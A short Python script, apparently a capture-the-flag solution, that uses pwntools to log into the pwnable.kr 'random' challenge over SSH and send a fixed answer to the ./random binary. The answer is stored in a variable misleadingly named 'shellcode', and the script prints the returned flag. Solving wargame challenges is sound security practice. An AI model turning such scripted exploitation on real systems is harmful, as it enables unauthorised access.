from pwn import *

REMOTE_ADDRESS = "pwnable.kr"
REMOTE_PORT = 2222
REMOTE_USERNAME = "random"
REMOTE_PASSWORD = "guest"

shell = ssh(host = REMOTE_ADDRESS, port = REMOTE_PORT, user = REMOTE_USERNAME, password = REMOTE_PASSWORD)
process = shell.process([b'./random'])

shellcode = b'3039230856'
process.sendline(shellcode)

# recv "Good!\n"
process.recvline()

flag = (process.recvline()).decode().strip()

print(f"Flag is: {flag}")